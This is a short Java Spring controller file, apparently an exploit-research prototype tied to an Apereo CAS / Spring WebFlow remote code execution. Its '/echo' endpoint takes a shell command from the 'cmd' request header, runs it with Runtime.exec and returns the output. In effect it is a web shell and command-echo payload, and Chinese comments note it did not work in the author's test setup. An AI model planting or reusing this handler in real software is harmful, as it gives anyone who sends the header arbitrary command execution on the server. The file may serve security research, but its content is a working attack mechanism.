package com.pizza;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import java.io.IOException;

@Controller
public class SpringWebFlowTestController {

    @GetMapping("/")
    public String redirectToFlow() {
        return "redirect:/pizza";
    }

    @GetMapping("/echo")
    public String test() throws IOException {

        //自己搭建的环境测试不成功，ExternalContextHolder.getExternalContext() 返回 null，可能是环境配置的不对
        //依赖：spring-webflow.jar
        //参考：
        //  1. https://www.00theway.org/2020/01/04/apereo-cas-rce/
        //  2. https://www.programcreek.com/java-api-examples/?class=org.springframework.webflow.context.ExternalContextHolder&method=getExternalContext

        org.springframework.webflow.context.servlet.ServletExternalContext servletExternalContext = (org.springframework.webflow.context.servlet.ServletExternalContext) org.springframework.webflow.context.ExternalContextHolder.getExternalContext();
        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) servletExternalContext.getNativeRequest();
        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) servletExternalContext.getNativeResponse();

        String cmd = request.getHeader("cmd");
		if(cmd != null && !cmd.isEmpty()){
			String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
			response.getWriter().println(res);
		}

        return "test";
    }
}
